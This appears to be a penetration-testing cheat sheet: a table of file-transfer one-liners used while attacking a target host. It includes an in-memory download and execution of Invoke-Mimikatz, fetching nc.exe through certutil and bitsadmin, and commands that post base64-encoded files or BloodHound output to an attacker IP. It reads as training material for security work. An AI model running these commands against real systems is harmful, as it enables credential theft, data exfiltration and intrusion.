[[Cheat Sheet - File Transfers]] duplicate 

| **Command**                                                                                                                     | **Description**                                       |
| ------------------------------------------------------------------------------------------------------------------------------- | ----------------------------------------------------- |
| `python3 -m http.server <port>`<br>or<br>`python -m SimpleHTTPServer <port>`<br>                                                | Host HTTP Server one-liner                            |
| `base64 -w 0 /path/to/file`                                                                                                     | Linux base64 /nowrap equivalent                       |
| `sudo impacket-smbserver -smb2support <SHARENAME> /home/kali/directory`                                                         | Host SMB server one-liner                             |
| `Invoke-WebRequest https://<snip>/PowerView.ps1 -OutFile PowerView.ps1`                                                         | Download a file with PowerShell                       |
| `IEX (New-Object Net.WebClient).DownloadString('https://<snip>/Invoke-Mimikatz.ps1')`                                           | Execute a file in memory using PowerShell             |
| <br>`Invoke-WebRequest -Uri http://10.10.10.32:443 -Method POST -Body $b64`<br>                                                 | Upload a file with PowerShell                         |
| `[Convert]::ToBase64String((Get-Content -path "c:\file\path" -Encoding byte))`                                                  | Base encode file, copy the string, then decode        |
| `bitsadmin /transfer n http://10.10.10.32/nc.exe C:\Temp\nc.exe`                                                                | Download a file using Bitsadmin                       |
| `certutil.exe -urlcache -split -f http://10.10.10.32/nc.exe <file_output(optional)>`<br><br>if this errors out, try other ports | Download a file using Certutil                        |
| `wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O /tmp/LinEnum.sh`                                | Download a file using Wget                            |
| `curl -o /tmp/LinEnum.sh https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh`                                | Download a file using cURL                            |
| `php -r '$file = file_get_contents("https://<snip>/LinEnum.sh"); file_put_contents("LinEnum.sh",$file);'`                       | Download a file using PHP                             |
| `scp C:\Temp\bloodhound.zip user@10.10.10.150:/tmp/bloodhound.zip`                                                              | Upload a file using SCP                               |
| `scp user@target:/tmp/mimikatz.exe C:\Temp\mimikatz.exe`                                                                        | Download a file using SCP                             |
| `Invoke-WebRequest http://nc.exe -UserAgent [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome -OutFile "nc.exe"`              | Invoke-WebRequest using a Chrome User Agent           |
| `xfreerdp /v:ip_address /u:username /p:password /dynamic-resolution +drive:data,/home/<user>`                                   | Drive redirection to gain access to files through RDP |
| `upload`<br>`download`                                                                                                          | upload or download whole directory with evil-winrm    |
| `Invoke-FileUpload -Uri http://<KALI_IP>:8000/upload -File C:\path\to\file`                                                     | Upload a file using PSUpload.ps1                      |
|                                                                                                                                 |                                                       |
